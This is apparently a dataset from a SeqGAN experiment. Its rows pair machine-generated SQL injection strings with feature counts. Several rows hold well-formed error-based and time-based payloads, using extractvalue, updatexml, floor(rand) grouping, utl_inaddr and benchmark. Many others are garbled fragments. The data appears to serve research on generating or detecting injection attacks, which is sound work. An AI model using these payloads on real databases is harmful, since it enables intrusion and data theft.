attack,1'tia_tt_ina--xsadyMoyyseuin_admnamaz_r,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,475,39.0,19.0,3.989778500580689,31.0,1.0,0.0,7.0,0.7948717948717948,0.02564102564102564,0.0,0.1794871794871795,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""   112  ,floor  (  )  4510  (     )    (  )  = and union from when  selectcun_acl  (  (  =  )  )     )      ,M union 1 1T  )  )   x  =,0x717a767a71,1   )   then or 8488 1  y  =l   )    ))    and  ,floor  113  ,0x717a767a71i  ||r  3326  122  ~  (  )  )    extractvalue  ||x xST where 4386  )  ||in*n)   )  rand   and or 0 from group ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,476,334.0,43.0,3.9058154779908705,107.0,49.0,135.0,43.0,0.3203592814371258,0.1467065868263473,0.4041916167664671,0.12874251497005987,0.0,1.0,0.0,0.0,1.0,4.0,0.0,23.0,0.0,1.0,6.0,11.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,2.0,1.0,2.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"17319'  0 from aua when  (  0x5c0x5c,  ||DRount_aastos _ Wsyeetinaunter.ar..  (  || DUNI.UNUINNcT  1045(  ||chr  0x5c  ||chr  (  113  )    )     )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,477,149.0,39.0,4.397275443956801,63.0,19.0,43.0,24.0,0.4228187919463087,0.12751677852348994,0.28859060402684567,0.1610738255033557,1.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,2.0,1.0,8.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%{""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,478,10.0,6.0,2.321928094887362,0.0,1.0,4.0,5.0,0.0,0.1,0.4,0.5,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1tjz.7881eat.gu' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'e(  (  4493  ,,  ||  rand  FROMt 3931 fromuan  rand  (  ,  )   4510",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,479,260.0,42.0,4.167654509517379,75.0,63.0,88.0,34.0,0.28846153846153844,0.2423076923076923,0.3384615384615385,0.13076923076923078,2.0,0.0,0.0,0.0,0.0,2.0,0.0,15.0,0.0,0.0,9.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'information_schema",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,480,197.0,31.0,3.6349730290998563,56.0,35.0,81.0,25.0,0.28426395939086296,0.17766497461928935,0.41116751269035534,0.12690355329949238,2.0,0.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,1.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'baju2an",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,481,201.0,33.0,3.9748412337677683,75.0,38.0,68.0,20.0,0.373134328358209,0.1890547263681592,0.3383084577114428,0.09950248756218906,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'n",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,482,180.0,26.0,3.3425404432630836,40.0,35.0,81.0,24.0,0.2222222222222222,0.19444444444444445,0.45,0.13333333333333333,2.0,0.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,483,331.0,37.0,3.7596608725843166,101.0,55.0,137.0,38.0,0.30513595166163143,0.1661631419939577,0.41389728096676737,0.1148036253776435,2.0,0.0,0.0,0.0,2.0,1.0,0.0,26.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,-or1%yNASNIIi n,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,484,15.0,13.0,3.640223928941852,11.0,1.0,1.0,2.0,0.7333333333333333,0.06666666666666667,0.06666666666666667,0.13333333333333333,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'x'  =  'kf'  =  'bpnau,",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,485,352.0,37.0,3.7080650030676905,100.0,45.0,144.0,63.0,0.2840909090909091,0.1278409090909091,0.4090909090909091,0.17897727272727273,6.0,0.0,0.0,0.0,0.0,4.0,0.0,28.0,0.0,3.0,1.0,24.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-5996    rand  0   (  )    )    ,floor   x  4232  )  *adl  (  a 3051 union 0 0 hx  (  =  R 1I. 0 1210  rand    5305 ) FROM   then 1 ||  chr  (  113  select and xu0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,486,174.0,38.0,3.910973093695517,52.0,38.0,69.0,15.0,0.2988505747126437,0.21839080459770116,0.39655172413793105,0.08620689655172414,0.0,0.0,1.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,1.0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1('+  (  select '   (  (  )   9325  a   )   x  1 byu2   )    ,floor  rand  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,487,75.0,26.0,3.2754231967567526,20.0,7.0,37.0,11.0,0.26666666666666666,0.09333333333333334,0.49333333333333335,0.14666666666666667,2.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'IqS+6085p  *     ) else by select 3785 r DNISSNTNUULIUS.USTINbyyT  =  )  rand,1   then by   SELECT by from   from selectWHERE when   (       )  ||chttss.x  -s x  DRUSSUunion FROM 0   or concat  e  amll    )  =  *,0x717a767a71,2|| 0 dr  ae from  achr  x where group group 11x._T  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,488,453.0,60.0,4.4466101227006805,203.0,47.0,159.0,44.0,0.4481236203090508,0.10375275938189846,0.3509933774834437,0.09713024282560706,2.0,0.0,1.0,0.0,2.0,2.0,0.0,21.0,0.0,1.0,7.0,10.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,"-7810ISThrselect 3440  ,concat  122  when  )  ,floor  rand  select 1  end   SELECT information_schema.s.chr  (  ||chr  (  122  113  ||  ||r  (  )  (  (  =       then 4493 where IM R   from 106  )  =  ||cr  )   ),concat  )       ,0x717a767a71,concat  =  )   then end  )   )   WHERE or 0a   )       AND1 1 d else by D   RMI.r.UT  )  *2   )    ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,489,341.0,51.0,4.183804015644684,135.0,38.0,128.0,40.0,0.39589442815249265,0.11143695014662756,0.375366568914956,0.11730205278592376,0.0,0.0,1.0,0.0,1.0,3.0,0.0,17.0,0.0,1.0,5.0,13.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"-65305=  --,0x717a767a712,  )    )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,490,34.0,14.0,3.4885061360562135,3.0,15.0,8.0,8.0,0.08823529411764706,0.4411764705882353,0.23529411764705882,0.23529411764705882,0.0,0.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,2.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1jw,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,491,3.0,3.0,1.584962500721156,2.0,1.0,0.0,0.0,0.6666666666666666,0.3333333333333333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-7864select LNU A.T else 50000001  )     )   SELECT group union when   (  )   tr  (   case ,  )    select   )    =  ||chr  (  SELECT end  )    )0x717a767a71=  =  )  ,    4493  select ||chhr  (  =  ||r  select and(  (  select union 1 else )    )O""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""    then x  case end  )havingna end   e )  )  abxddhhr  (  select   3326 1 9891 where   thenx *",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,492,567.0,49.0,3.988996498509937,215.0,71.0,220.0,61.0,0.37918871252204583,0.12522045855379188,0.3880070546737213,0.10758377425044091,0.0,2.0,1.0,0.0,1.0,5.0,0.0,38.0,0.0,0.0,7.0,13.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,8.0,2.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,"1"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""athr  6055  ||chr  (  *  6825,    havingD  )  ,  ||xa when   then then   (  (  select   e  )   tdbptr  (  112  )   then from  113  ||chr  =  )   xx   or x end  0  )   )     )   )    )     --i,thenr  (  )  6237,concat  =  0   )  case 4386 group FROM(  =  ||r  (  )   then by else 3440  )    FROM concat  ||chr  (  select   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,493,650.0,48.0,3.793546367773016,206.0,73.0,274.0,97.0,0.3169230769230769,0.1123076923076923,0.42153846153846153,0.14923076923076922,0.0,2.0,2.0,0.0,1.0,5.0,0.0,49.0,0.0,3.0,4.0,38.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,0.0,4.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'jw",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,494,206.0,31.0,3.835044834734358,71.0,37.0,76.0,22.0,0.3446601941747573,0.1796116504854369,0.36893203883495146,0.10679611650485436,2.0,0.0,0.0,0.0,0.0,1.0,0.0,14.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"11 Jinformation_schema' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'f_bfsntts0x7171706a71,rounatrids.x.r.dr.thr    =  =  || information_schema or endE  )    then and ms 8488 end   WHERE from when  )    and   or  1 or  1 (  case D 17881 SpINCT.SNconcat6055(  a 0   x D end  )         )     )  ||chr  (  select FROM delsetc  uatsxs 0 9067 or  ||coun",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,495,581.0,56.0,4.375115212900295,258.0,75.0,189.0,59.0,0.4440619621342513,0.12908777969018934,0.3253012048192771,0.10154905335628227,2.0,0.0,0.0,0.0,2.0,4.0,0.0,27.0,0.0,5.0,6.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,2.0,4.0,2.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,20.0
attack,"1wzvez'  =  'TSELECTtolunialxj,hxunlfvo",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,496,39.0,25.0,4.496815359832416,30.0,1.0,4.0,4.0,0.7692307692307693,0.02564102564102564,0.10256410256410256,0.10256410256410256,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'ehsi",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,497,301.0,38.0,3.9998566116107424,105.0,55.0,109.0,32.0,0.3488372093023256,0.18272425249169436,0.36212624584717606,0.10631229235880399,2.0,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,1yf'  =  'n,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,498,11.0,7.0,2.550340709546388,3.0,1.0,4.0,3.0,0.2727272727272727,0.09090909090909091,0.36363636363636365,0.2727272727272727,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'||  (  select 'r m    xu    )     n when   (  benchmark  113  ,  113  rand  (   4232  *     )  )   )   and  6237",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,499,114.0,29.0,3.357331986082428,31.0,15.0,55.0,13.0,0.2719298245614035,0.13157894736842105,0.4824561403508772,0.11403508771929824,2.0,0.0,0.0,0.0,1.0,0.0,0.0,7.0,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
